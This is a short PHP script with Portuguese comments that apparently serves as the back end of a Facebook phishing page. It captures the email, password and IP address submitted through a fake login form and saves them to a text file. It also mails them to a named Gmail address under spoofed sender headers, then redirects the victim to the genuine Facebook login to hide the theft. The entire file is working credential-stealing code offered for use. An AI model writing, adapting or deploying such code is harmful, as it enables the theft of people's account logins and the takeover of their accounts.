<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recebe os dados enviados via POST
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];

    // Salva os dados em um arquivo txt
    $file = fopen("dados.txt", "a");
    fwrite($file, "Email: " . $email . " - Senha: " . $pass . " - IP: " . $ip . "\n");
    fclose($file);

    // Envia os dados por email
    $to = 'bobmarok113@gmail.com';
    $subject = 'LOGIN';
    $message = "Email: " . $email . " - Senha: " . $pass . " - IP: " . $ip;
    $headers = 'From: wwww@ariimoveiscaldasnovas.com.br' . "\r\n" .
        'Reply-To: www@ariimoveiscaldasnovas.com.br' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);

    header('Location: https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fprofile.php&refsrc=deprecated&refid=17');
}
